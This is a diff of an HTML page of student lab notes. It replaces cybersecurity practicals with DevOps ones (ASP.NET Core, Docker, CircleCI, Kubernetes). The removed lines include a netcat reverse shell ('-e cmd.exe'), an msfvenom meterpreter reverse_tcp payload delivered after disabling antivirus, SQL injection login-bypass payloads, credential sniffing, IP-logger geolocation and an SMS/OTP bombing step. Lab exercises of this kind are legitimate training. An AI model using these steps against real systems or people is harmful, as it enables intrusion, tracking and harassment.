@@ -49,13 +49,143 @@
     <button onclick="copyText(text6)">6 - Working with CircleCI for Continuous Integration</button>
     <button onclick="copyText(text7)">7 - Creating Backing service with ASP.NET 2.0 core</button>
     <button onclick="copyText(text8)">8 - Kubernetes</button>
-    <button onclick="copyText(text9)">9 NCAT</button>
     
     
     <p id="copiedMsg"></p>
     <script>
-        var text1 = `# 1 - RSA
+        var text1 = `# 1 - Building ASP.NET Core MVC Application
 
+        # 1) Install .Net Core Sdk
+# (Link:https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install)
+
+# 2) Create folder MyMVC folder in D: drive
+# folder -- MyMVC
+# 3) Open command prompt and perform following operations Command: to create mvc project
+# dotnet new mvc --auth none 
+
+# 4) Go to controllers folder and modify HomeController.cs file to match following:
+# CODE:
+# using System;
+# using System.Collections.Generic;
+# using System.Diagnostics;
+# using System.Linq;
+# using System.Threading.Tasks;
+# using Microsoft.AspNetCore.Mvc;
+# using Microsoft.Extensions.Logging;
+# using MyMVC.Models;
+# namespace MyMVC.Controllers
+# { public class HomeController : Controller
+# {
+# public String Index()
+# { return "Hello World, Heyy Shipra!"; }
+# }
+# }
+
+# 5) Run the project on CMD
+# D:\MyMVC>dotnet run
+
+# 6) Now open browser and type URL: localhost:5167  ( 5167 - your host no dotnet run)
+
+# 7) Now go back to command prompt and stop running project using CTRL+C
+
+# 8) Go to models folder and add new file StockQuote.cs to it with following content
+# CODE:
+# using System;
+# namespace MyMVC.Models
+# {
+# public class StockQuote
+# { public string Symbol {get;set;}
+# public int Price{get;set;}
+# }
+# }
+
+# 9) Now Add View to folder then home folder in it and modify index.cshtml file to match following
+# CODE:
+# @{
+# ViewData["Title"] = "Home Page";
+# }
+# <div>
+# Symbol: @Model.Symbol <br/>
+# Price: $@Model.Price <br/>
+# </div>
+
+# 10) Now modify HomeController.cs file to match following:
+# using System;
+# using System.Collections.Generic;
+# using System.Diagnostics;
+# using System.Linq;
+# using System.Threading.Tasks;
+# using Microsoft.AspNetCore.Mvc;
+# using Microsoft.Extensions.Logging;
+# using MyMVC.Models;
+# namespace MyMVC.Controllers
+# {
+# public class HomeController : Controller
+# { public async Task <IActionResult> Index()
+# {
+# var model= new StockQuote{ Name='Shipra', RollNo=014};
+# return View(model);
+# }
+# }
+# }
+
+# 11) Now run the project iin cmd using
+# dotnet run
+
+# 12) Now go back to browser and refresh to get modified view response
+
+
+    `;
+        var text2 = `# 2 - Building ASP. NET Core REST API
+
+        /*
+# 2 - Building ASP. NET Core REST API
+
+
+# Software requirement:
+# 1) Download and install
+# https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install
+
+# 2) Check everything installed correctly
+# Command prompt
+# > dotnet
+
+# Create your web API
+# 1. Open two command prompts
+# Command prompt 1:
+# Command:
+# dotnet new webapi -o Glossary
+
+# Command:
+# cd Glossary
+# dotnet run
+
+# 2. Command Prompt 2: (try running ready-made weatherforecast class for testing)
+# Command:
+# curl --insecure http://localhost:5247/weatherforecast  ( 5247 - your host no dotnet run)
+
+# Open Web browser type
+# localhost:5247/weatherforecast
+
+# 3. Now Change the content:
+# To get started, remove the WeatherForecast.cs file from the root of the project and the WeatherForecastController.cs file from the Controllers folder.
+# Add Following two files
+# 1) D:\Glossary\GlossaryItem.cs (type it in notepad and save as all files)
+
+# //GlossaryItem.cs
+# namespace Glossary
+# {
+# public class GlossaryItem
+# {
+# public string Term { get; set; }
+# public string Definition { get; set; }
+# }
+# }
+
+
+# 2) D:\Glossary\Controllers\ GlossaryController.cs (type it in notepad and save as all files)
+
+# //Controllers/GlossaryController.cs*/
 /*using System;
 using System.Collections.Generic;
 using Microsoft.AspNetCore.Mvc;
@@ -102,389 +232,544 @@ return Ok(glossaryItem);
 }
 [HttpPost]
 public ActionResult Post(GlossaryItem glossaryItem)
-{*/
+{
+    var existingGlossaryItem = Glossary.Find(item =>
+item.Term.Equals(glossaryItem.Term, StringComparison.InvariantCultureIgnoreCase));
+if (existingGlossaryItem != null)
+{
+return Conflict("Cannot create the term because it already exists.");
+}
+else
+{
+Glossary.Add(glossaryItem);
+var resourceUrl = Path.Combine(Request.Path.ToString(), Uri.EscapeUriString(glossaryItem.Term));
+return Created(resourceUrl, glossaryItem);
+}
+}
+[HttpPut]
+public ActionResult Put(GlossaryItem glossaryItem)
+{
+var existingGlossaryItem = Glossary.Find(item =>
+item.Term.Equals(glossaryItem.Term, StringComparison.InvariantCultureIgnoreCase));
+if (existingGlossaryItem == null)
+{
+return BadRequest("Cannot update a nont existing term.");
+} else
+{
+existingGlossaryItem.Definition = glossaryItem.Definition;
+return Ok();
+}
+}
+[HttpDelete]
+[Route("{term}")]
+public ActionResult Delete(string term)
+{
+var glossaryItem = Glossary.Find(item =>
+item.Term.Equals(term, StringComparison.InvariantCultureIgnoreCase));
+if (glossaryItem == null)
+{ return NotFound();
+}
+else
+{ Glossary.Remove(glossaryItem);
+return NoContent();
+}
+}
+}
+}*/
 
+// Go to Glossary folder Controllers folder and check GlossaryControllers.cs
 
-    `;
-        var text2 = `# 2 IP Configuration
+/*
+3.Now stop running previous dotnet run on command prompt 1 using Ctrl+C. and Run it again for new code.
+On Command prompt1:
+Command:
+dotnet run
 
-#ipconfig/displaydns
-#ipconfig/all
-#ipconfig/flushdns
-#wmic os get osarchitecture
+*/
 
+/*
+On Command prompt2:
+1) Getting a list of items:
+Command:
+curl --insecure http://localhost:5052/api/glossary
+*/
 
+/*
+2) Getting a single item
+Command:
+curl --insecure http://localhost:5052/api/glossary/MVC
+*/
 
+/*
+3) Creating an item
+Command:
+curl --insecure -X POST -d "{\"term\": \"MFA\", \"definition\":\"An authentication process.\"}" -H
+"Content- Type:application/json"https://localhost:5052/api/glossary
+curl --insecure http://localhost:5052/api/glossary
+*/
 
-#ipconfig/displaydns
-#The command "ipconfig /displaydns" is used in Windows systems to show the contents of the
-#Domain Name System (DNS) resolver cache. This cache stores information about recently resolved
-#DNS queries, including the corresponding IP addresses.
+/*
+4)Update Item
+Command:
+curl --insecure -X PUT -d "{\"term\": \"MVC\", \"definition\":\"Modified record of Model View
+Controller.\"}" -H "Content-Type:application/json" http://localhost:5052/api/glossary
+*/
 
+/*
+5) Delete Item
+Command:
+curl --insecure --request DELETE --url https://localhost:5052/api/glossary/openid
+*/
 
-
-#ipconfig/all
-#The command "ipconfig /all" is used in Windows systems to display detailed information about
-#network interfaces, including their configurations and current network settings.
-
-
-
-#ipconfig/flushdns
-#The command "ipconfig /flushdns" is used in Windows systems to clear the DNS resolver cache.
-#This cache stores information about previously resolved DNS queries, and flushing it can be helpful
-#in troubleshooting DNS-related issues or when you want to force your computer to re-query DNS
-#servers for domain name resolution.
-
-
-
-#wmic os get osarchitecture
-#The command "wmic os get osarchitecture" is used in Windows systems to retrieve information
-#about the operating system architecture. When you run this command in the Command Prompt, it
-#will return the architecture of the operating system, either 32-bit or 64-bit.
 
 `;
 
-        var text3 = ` # 3 Browser History Examiner
+        var text3 = ` # 3 - Working with Docker, Docker commands, Docker images & Containers
         
-        #Step 1 – Download the BHE Browser History Examiner tool.
-        #https://www.foxtonforensics.com/browser-history-examiner/
-        
-        #Step 2 – Open “Browser History Examiner” and click on “Continue Trial.
-        
-        #Step 3 – Click on “Capture History”
-        
-        #Step 4 – Click on “Capture history from this computer” then Next it will discover user profiles.
-        
-        #Step 5 – It will display the User Profile “shipra” and check the Browser and Data and select Destination folder and Capture.
-        
-        #Step 7 – It will display all the Data.
-        #Logins
-        #Cache images
-        #Email Address
-        #Website Visits
+        /*
+1) login to https://labs.play-with-docker.com/
+Click on start
+*/
+
+/*
+2) Add new instance
+*/
+
+/*
+3) Perform following:
+Method1:
+To pull and push images using docker
+Command: to check docker version
+docker –version
+*/
+
+/*
+Command: to pull ready-made image
+docker pull rocker/verse
+*/
+
+/*
+Command: to check images in docker
+docker images
+*/
+
+/*
+4) Now Login to docker hub and create repository
+
+5) Click on Create button
+Now check repository created
+*/
+
+/*
+6) Preform following:
+Command: to login to your docker account
+docker login --username=shipra1911
+password: *********
+note: shipra1911 is my docker ID. You will use your docker ID here. And enter your password.
+*/
+
+/*
+Command: to tag image
+docker tag 6c3136533a9d shipra11/repos1:shipra
+note: here 6c3136533a9d this is image id which you can get from docker images command.
+*/
+
+/*
+Command: to push image to docker hub account
+docker push shipra1911/repos1:shipra
+note: shipra is tag name created above.
+*/
+
+/*
+7) Check it in docker hub now
+
+8) Click on tags and check
+*/
+
+
+/*
+Method 2:
+1) Build an image then push it to docker and run it
+Command: to create docker file
+1. cat > Dockerfile <<EOF
+2. FROM busybox
+3. CMD echo "Hello world! This is my first Docker image."
+4. EOF
+*/
+
+/*
+2) Build docker
+docker build ./
+*/
+
+/*
+3) Now Login to docker hub and create repository
+
+4) Perform following:
+docker images
+docker tag cf45d3ef417e shipra1911/repo2:Naruto
+(tag - cf45d3ef417e [put <none value of your>])
+docker images
+(you can see repo2)
+docker run shipra1911/repo2:Naruto
+Heyy its Shipra!!!
+docker images
+docker push shipra1911/repo2:Naruto
+*/
+
+/*
+5) Check it in docker hub now
+
+6) Click on tags and check
+*/
         
 `;
 
-        var text4 = ` # 4 Grabify
+        var text4 = ` # 4 - Installing s/w packages on Docker
         
-        #Using Grabify - https://grabify.link/
-        #Step 1 – Go to GRABIFY site using the above link and enter the “w3schools” link to create a new URL.
-        
-        #Step 2 – The new URL created
-        
-        #Step 3 – It will show the Advanced Log.
-        #(all the information about the device)
-        
-        #Step 4 – Using Ip latitude & longitude we can check the device current location.
-        #IP LATITUDE 19.0760 (19° 4′ 33.51″ N)
-        #IP LONGITUDE 72.8774 (72° 52′ 38.57″ E
+        /*
+Step 1 - Signup “Docker Desktop”.
+Login
 
-        # Step 5 - https://www.whatismyip.com/ip-address-lookup/
-        # check ip address 
-        # IPData.co and find the geolocation
+Step 2 - pull the ubuntu docker image.
+(Open cmd type)
+docker pull ubuntu
+
+Step 3 - Run the ubuntu container after you get the shell access, update the container.
+docker run -it ubuntu
+
+Step 4 - Install Firefox using APT
+root:/#  apt-get -y install firefox
+
+Step 5 - Install the vim using apt-get.
+root:/#  apt-get -y install vim
+
+Step 6 - Type vim to redirect the vim editor.
+vim
+
+
+
+Let’s work on volume:
+Step 1 - analyze docker volume
+(Create a folder DockerVolume and Open cmd in that folder type)
+docker volume
+
+Step 2 - create a docker volume using myvol1
+(same cmd)
+docker volume create myvol1
+
+Step 3 - list volume
+(same cmd)
+docker volume ls
+
+Step 4 - inspect your volume
+(same cmd)
+docker volume inspect myvol1
+
+Step 5 - remove volume
+(same cmd)
+docker volume rm myvol1
+
+Step 6 - verify the removal
+(same cmd)
+docker volume ls
+
+
+
+Let’s work with network:
+Step 1 - pull image (bookworm image)
+docker image pull debian:bookworm
+
+Step 2 - create a network
+docker network create shipranetwork
+
+Step 3 - connect a network to a container
+docker ps
+
+Step 4 - list all network
+docker network ls
+
+Step 4 - inspect the network
+docker network inspect shipranetwork
+
+Step 5 - Delete unused network
+docker network prune
+
+*/
 
 
          
 `;
 
-        var text5 = `# 5 SMS/ Phone Bomber
+        var text5 = ` # 5 - Working with Docker Volumes & Networks
+
+        /*
+Prerequisites:
+1. Open Window Firewall
+2. Click on Advance security
+3. Click on Inbound Rules
+4. Create a New Rule
+a. Which type of rule would you like to create  port
+b. Does this rule apply the local ports or specific local
+c. Select Specific local ports – 80
+d. What action should be taken when a connection matches the specified conditions?
+- Allow the connection
+e. When does this apply? – Domain, Private, Public
+f. Name: ReportServer
+g. Description: ReportServer
 
 
-    #Step 1 – Go to the below link to Protect your Number Permanently from OTP Bombarding.
-    #https://greatonlinetools.com/smsbomber/protect/
 
-    #Step 2 – Using the same link, we can be bombarded with OTP to anyone’s phone number.
+Open docker playground
+https://labs.play-with-docker.com/
 
-    #Step 3 – SMS BOMB SUCCESSFUL.
-    #(After entering the phone number and click on start it will be bombarded with OTP to the entered phone number.)
+Step 1: Enter the following Commands.
+a) docker pull nginx 
+(--- nginx: nginx is the image which is already available in docker.)
+
+b) docker run -it --name=WebApp -d -p 80:80 nginx
+(): Create a webapp and run it with nginx image on port 80.)
+
+
+Step 2: Click on Port and enter 80 in the dropdown window and click OK.
+(The below webpage will be visible.)
+
+
+Step 3: Enter the below command in order to enter into bash shell and then open. port 80.
+docker exec -it WebApp bash
+cd /usr/share/nginx/html
+echo "Hey its shipra!"> index.html 
+exit
+(refresh the browser and it will display[Hey its shipra!])
+
+
+Step 4: List all the running containers: docker ps
+docker ps
+docker stop WebApp
+
+
+Step 5: Create another container in Docker. WebAppl
+docker run -it --name=WebApp1 –d -p 80:80 nginx
+
+
+Step 6: Click on port and enter 80 in the dropdown and click ok.
+Output: the welcome page of nginx should be visible
+
+
+
+Problem: Updates made in one container is not reflected into another container.
+Solution: Volume
+Update made in one container within the volume will be reflected in all the containers of that volume.
+
+
+Step 7: Creation of Volume(MyVolume)
+Command:
+a) docker volume create MyVolume
+b) docker volume Is
+c) docker volume inspect MyVolume
+d) docker stop WebApp1
+
+
+Step 8: Create a container (WebApp2) inside the container MyVolume
+docker run -d --name=WebApp2 --mount source=MyVolume,destination=/usr/share/nginx/html -p 80:80 nginx
+
+
+Step 9: Enter the below commands:
+a) ls /
+b) cd /var/lib/docker
+c) ls
+d) cd volumes
+e) Is
+f) cd MyVolume
+g) Is
+h) cd _data
+
+
+Step 10: Edit the index file with the below content to "Display the content on the Webpage".
+echo "From MyVolumes Hello Shipraa!" > index.html
+
+Open Port 80
+
+Step 11: Stop the above container (WebApp2) and Create another container within the volume (MyVolume).
+docker stop WebApp2
+docker run -d --name=WebApp3 --mount source=MyVolume,destination=/usr/share/nginx/html -p 80:80 nginx
+(refresh the browser)
+Output: The edits made in one container of the volume will be reflected in all the containers of that volume.
+
+
+*/
         
   `;
   
-        var text6 = ` # 6 UI Path
+        var text6 = ` # 6 - Working with CircleCI for Continuous Integration 
 
-#Step 1 – Open you’re “GMAIL” go to “Security” click on 2-step Verification.
+        /*
+Login to Github
+Step 1 - setup a repository names as hello-world.
 
-#Step 2 – In 2-Step Verification click on “App passwords”.
 
-#Step 3 – Go to App Passwords and add a “APP name” as “LOGIN” as your choice and create.
+Step 2 - Login to app.circleci.com with the same GitHub account & Select Organization.
 
-#Step 4 – After creating an App name, it will automatically “Generated app password”.
 
-#Step 5 – Use this link to “Sign up” in “Ui path” https://www.uipath.com/product/automation-cloud/ and “choose an account” to continue.
+Step 3 - Set up project hello-world which we created earlier.
 
-#Step 7 – Now “Sign in” to your account.
 
-#Step 8 – Click on “Download Studio” it will start downloading then start to “install”.
+Step 4 - Select the config.yml file.
+(Faster)
 
-#Ui-path Setup
-#Step 9 – Choose (“Quick (recommended for Community Users”) accept terms and click on Install after installation is completed “Launch Uipath Studio”.
 
-#Step 10 – Sign in with the account to “Connect to tenant”.
+Step 5 - After the successful integration it will be seen like this.
+(Success)  say-hello-workflow
 
-#Step 11 – Choose “UiPath Studio”.
 
-#Step 12 – Go to New Project and click on “Process”.
+Step 6 - login to GitHub open your hello-world repo.
 
-#Step 13 – Start with a New Blank Process add the Name specify Location and Create.
 
-#Step 14 – This is the interface we will get.
+Step 7 - Observe te config.yml. (by clicking on .circleci)
 
-#Step 15 – Click on “+” and search “Input Dialog” and drop it.
 
-#Step 16 – Add the Data to Dialog Title as “DATA”, Input label as “ENTER THE EMAIL_ID OF RECEIVER” and Value entered as email.
+Step 8 - Open the config/yml file and edit the code as shown below(make sure to have proper indentation).
 
-#Step 17 - Click on “+” and search “SMTP” and drop it.
-#Enter same Email and generated app password. in Logon
-#Enter Port 587 and server “smtp.gmail.com”. in Host
-#Enter value to subject and body to the receiver mail.  Send SMTP Mail Message
-# To - eamil
-# Subject - "UIPATH"
-# Body - "Heyy Shipra!"
+version: 2.1
 
-#Step 18 - Click on “+” and search “Message Box” and drop it.
-# Message Box - email sent!
+jobs:
+  one:
+    docker:
+      - image: cimg/ruby:2.6.8
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    steps:
+      - checkout
+      - run: echo "A first Hello word"
+      - run: sleep 25
 
-#Step 19 – Now Run.
+  two:
+    docker:
+      - image: cimg/ruby:3.0.2
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    steps:
+      - run: echo "A first Hello word"
+      - run: sleep 25
 
-#Step 20 – Pop up will appear to enter the email_id of receiver and click on Ok.
-#email sent!
+workflows:
+  version: 2.1
+  one_and_two:
+    jobs:
+      - one
+      - two
 
-#Step 21 – Now check to the receiver email id to see the message.
+Commit Changes
+(Go to circleci hello-world check)
+Output: Success one_and_two[click on one_and_two to see boxes]
 
+*/
 `;
 
-        var text7 = ` # 7 Wireshark
+        var text7 = ` # 7 - Creating Backing service with ASP.NET 2.0 core
 
-#Step 1 - Open Wireshark and either you can load the pre-captured files (pcap/pcapng) or start a live capture through the network.
-
-#Step 2 - Start the Wireshark in background and go to an unsecure website so we can fetch the credentials.
-#Sample Website: http://testphp.vulnweb.com/login.php
-
-#Step 3 - Now, stop capturing the data packets and go to search filter and type http, here all http protocol related packets will be displayed.
-
-#Step 4 - To get the exact packet, type http.request.method=="POST" in the display filter and select the packet and as we can see the credentials have been revealed.
-
-#Step 5 – To see the captured Username & Passwords go to the HTML Form URL Encoded and click you can see the Username as “Shipra1911” and Password as “ship@19”.
-
-`;
+        /*
+Step 1 - Open play with Docker.
+login to https://labs.play-with-docker.com/
+Click on start
 
 
-var text8 = ` # 8 FTK Manager
-
-#Step 1 – Click on File then choose “Create Disk Image…” enter.
-
-#Step 2 – Select “Physical Drive” as the Source Evidence Type.
-
-#Step 3 – Choose PHYSICALDRIVE1 “USB Device” enter Finish.
-
-#Step 4 – Go to “USB Drive (E:)” Img Folder there are some images saved.
-
-#Step 5 – Next, we have to “Permanently delete these images” and now the folder is empty.
-
-#Step 6 – Add and “Select Image Type” as “Raw (dd) enter Next >.
-
-#Step 7 – Add the “Evidence Item Information” and select “Destination Folder” for the Image.
-
-#Step 8 – Select “Image Destination Folder”, add “Image File Name” and make Image size to “0”.
-
-#Step 9 – Click on “Start” and it will start “Creating Image”.
-
-#Step 10 – “Image Created Successfully” and it will start “Verifying”.
-
-#Step 11 – Click on “Image Summary” and after verified Image Results will display.
-
-#Step 12 – Go to File and “Add Evidence Item”.
-
-#Step 13 – Select Source Evidence Type as “Image File” and “Browse” the source path selects and Finish.
-
-#Step 14 – Click on “FTKRaw.001” and select “Img” folder and we can find the retrieved images.
-
-#Step 15 – We can check the “USB Drive” its empty the images are deleted and not rederived here.
-
-#Step 16 – We can simply “Export Images” by right click on image and “Export Files”
-
-#Step 17 – Select the “Destination Folder” to export the images click OK.
-
-#Step 18 – Images are “Exported Successfully!”.
-
-`;
+Step 2 – Add new instance.
 
 
-var text9 = ` # 9 NCAT
+Step 3 - Initiate the session.
 
-#Step 1 – Open “root kali” and type “ifconfig” to check the ip address.
-# “ifconfig”
+Step 4 - start a team service on port 5000
+docker run -d -p 5000:5000 -e PORT=5000 \-e LOCATION_URL=http://localhost:5001 dotnetcoreservices/teamservice:location
 
-#Step 2 - To check the IP Address from Windows command prompt type “ipconfig”.
-# “ipconfig”
-
-#Step 3 – To check the “active port” type “ufw status” and port 22 is active.
-# “ufw status”
-
-#Step 4 - The command "nc -lvp 22" starts a netcat listener on port 22 with verbose output enabled.
-# "nc -lvp 6969"
-# open cmd type : 192.168.0.103 6969 -e cmd.exe    
-
-#Step - 5 Now, start “msfconsole” and “msfvenom”.
-# msfconsole
-# msfvenom
-
-#Step 6 – Type msfvenom -p windows/meterpreter/reverse_tcp host=192.168.0.103 lport=6969 -f exe> /home/shipra/Desktop/Shipra/reverse_tcp.exe
-
-#Step 7 - Now, use exploit.
-# use exploit
-
-#Step 8 - python -m http.server – The command "python -m http.server".
-# python -m http.server
-#starts a simple HTTP server serving files from the current directory.
-
-#Step 9 - Now, start the exploit with the multi handler and set the lhost and lport.
-# use exploit/multi/handler
-# set lhost 192.168.0.103
-# set lport 6969
-# exploit
-
-# check reverse_tcp.exe in kali
+docker run -d -p 5001:5001 -e PORT=5001 dotnetcoreservices/locationservice:nodb
 
 
-#Step 10 – Turn off the “Firewall & network protection and “Virus & threat protection”.
+Step 5 - Check the images to verify the team service docker images.
+(port 5000 / 5001)
 
-#Step 11 - Add the IP address and port number into the web browser
-#(Note: Make sure your windows security is disabled).
-# browser -- 192.168.0.103:8000
 
-#Step 12 - Now, download the reverse_tcp.exe and double click on it to start.
+Step 6 - Check the images to verify the team service docker images.
+docker images
 
-#Step 13 - We can access the files of the device to our virtual environment and can also perform any actions on the device such as making a directory or deleting any file or folder. 
+
+Step 7 - start a team Curl request, create a new team
+curl -H "Content-Type:application/json" -X POST -d '{"id":"e52baa63-d511-417e-9e54-7aab04286281","name":"KC"}' http://localhost:5000/teams
+
+
+Step 8 - Verify the team by its ID
+curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+
+Step 9 - Add a member into the team
+curl -H "Content-Type:application/json" -X POST http://localhost:5000/teams/e52baa63-d511-417e-9e54-
+7aab04286281/members -d'{"id":"63e7acf8-8fae-42ce-9349-3c8593ac8292",
+"firstName":"Shipra","lastName":"Jana"}'
+
+
+Step 9 - Verify the addition of the team member
+curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+
+Step 10 - Add a location to the particular member with its ID
+curl -H "Content-Type:application/json" -X POST -d '{"id":"64c3e69f-1580-4b2f-a9ff-2c5f3b8f0e1f","latitude":12.0,"longitude":12.0,"altitude":10.0,"timestamp":0,"memberId":"63e7acf8-8fae-42ce-9349-3c8593ac8292"}' http://localhost:5001/locations/63e7acf8- 8fae-42ce-9349-3c8593ac8292
+
+
+Step 11 - verify the location tag of the team member
+curl http://localhost:5001/locations/63e7acf8-8fae-42ce-9349-3c8593ac8292
+
+*/
 
 `;
 
 
-var text10 = ` # 10 SQL Injection
+var text8 = ` # 8 - Kubernetes
 
-# Performing SQL injection to LOGIN (Get Access) into a website.
-# Step 1: Here we are going to use a “Testing Website” to perform SQL Injection.
-# https://demo.testfire.net/login.jsp
-
-# Step 2: Login using random Username and Password.
-# Username: admin’         
-# Password: password123
-# Syntax error - Login Failed!
-
-# SQL Injection Payloads
-# OR payload
-
-# Step 3: Now we are going to use “OR Payload” to LOGIN.
-# Username: admin' OR '1'='1  
-# Password: password123
-
-# Login Successfully!
-# Because we have used OR payload to logged in to the website.
-
-# Comment Payload (--)
-# Step 5: Now we are going to use (Comment Payload) to LOGIN.
-# Username: admin’--
-# Password: 123
-# Login Successfully! .
+/*
+Step 1 – Use this link to Login in Kubernetes using “GitHub”.
+https://labs.play-with-k8s.com/
 
 
-`;
+Step 2 – Add the Github account to connect with Kubernetes.
 
 
-var text11 = ` # 11 Maltego
+Step 3 – Add New Instance.
 
-# Perform Maltego
-# Step 1: Open Maltego and click on “New” to Create a “New Graph”
 
-# Step 2: Select “IPv4 Address” in the Entity Palate and drop on the Graph double click on IPv4 and add IP Address as “172.217.12.174” (Google).
+Step 4 – Initiate the Session.
 
-# IP Address is changed now.
 
-# Step 3: Right click on the IP Address and select “IP Owner Detail” and RUN.
+Step 5 - Initialize the master node:
+kubeadm init --apiserver-advertise-address $(hostname -i) --pod-network-cidr 10.5.0.0/16
 
-# Step 4: All the detail about the IP Address is appeared in a BLOCK Layout mode.
 
-# Step 5: Right Click on IP Address and Select “To DNS Name” and RUN.
-# Available DNS Name
+Step 6 - Configure your kubectl
+kubectl apply -f https://raw.githubusercontent.com/cloudnativelabs/kube-router/master/daemonset/kuberouter.yaml
+kubectl get nodes
 
-# Step 6: Select “DNS Name” and drop.
 
-# Step 7: Right Click on DNS Name to edit the IP Address to find the IP Owner Details and RUN. 
+Step 7 - Validate is there any pods available (as of now no pods)
+kubectl get pods
 
-# Step 8: Select “DOMAIN” and drop.
 
-# Step 9: Right Click on Domain and edit Domain name to “gnu.org” and select “Domain Owner Detail”.
+Step 8 - Create 3 nginx pods.
+kubectl create deployment my-dep --image=nginx --replicas=3
+kubectl get pods
 
-# Step 10: Select “Email Addresses from Domain and RUN.
-# It will show all the available “Email-ID” related to “gnu.org” Domain.
 
+Step 9 - To check with services are running 8. check the docker version.
+kubectl get services
+
+
+Step 10 - Check the docker version.
+docker -v
+
+*/
 
 `;
 
-
-var text12 = ` # 12 Putty SSH
-
-# Step 1 - Since we are Performing the Practical in our virtual machine be sure to check whether Our Network is “Bridged” i.e., the kali network works independently and has its own IP address. We’ll be using
-# “ifconfig” Command to check the IP address.
-# ifconfig
-
-# Step 2: - To check the IP Address from Windows command prompt.
-# ipconfig
-
-# Step 3 - Let’s create a folder to access remotely.
-# Commands: -
-#  cd /home: This Command helps us to change the directory to home folder  “cd /{folder_name}”
-#  mkdir /testfile: This command will create a folder “mkdir /{Folder_Name}”
-
-# cd /home
-# mkdir testfile
-# cd testfile/
-
-# Step 4 - Now we’ll create a text file in the folder that we’ve created. Once created we can insert any text in that file.
-# Commands: -
-# cat > xyz.txt
-# Heyy Shipra!
-#  "CTRL+D" to save the file.
-
-# Step 5 - Now we’ll be checking the upgradable packages and upgrading necessary dependencies.
-# apt update
-# - this command allows us to check the available updates and set the dependence tree.
-
-# Step 6 - We will install the Open SSh server in our kali to get capability to remotely access the terminal.
-# We can install using “apt install openssh-server” command.
-# apt install openssh-server
-
-# Step 7 - Install ufw for security creating rules for network and check the status where it’ll show us the availability of the firewall and the rules applied.
-# Commands: -
-# apt install ufw            : To install ufw in kali.
-# ufw status                 : show the status of the firewall by default ufw status is disabled.
-# ufw enable                 : this command is to enable the firewall.
-
-# Step 8 - Let’s add rule on our firewall by using “ufw allow 22/tcp”. The port (22) is used for Secure Shell
-# (SSH) communication and allows remote administration access to the VM. In general, traffic is encrypted using password authentication.
-# ufw allow 22/tcp
-
-# Step 9 - Now we’ll start the server so that we can remotely access the terminal and check the status if the server is up and running.
-# Command: -
-# service ssh start             : This command starts the server on the IP address and port 22 which is rule which we have set above.
-# service ssh status            : This will give the update and status of the server if its Running or down
-
-# service ssh start 
-# service ssh status
-
-# Step 10 - Now we’ll start putty and provide IP address of our kali machine and the port i.e. 22, connection type will SSH and select telnet.
-
-# Step 11: - After it is connected, we’ll be prompted to enter the kali credentials to access the terminal.
-# ip - 192.168.0.103   port - 22
-
-# Step 12: - After Logging in We can access the terminal and access the file which we have created.
-# cd /home
-# ls
-# cd testfile/
-# ls
-# cat xyz.txt
-
-`;
 
 
 function copyText(text) {
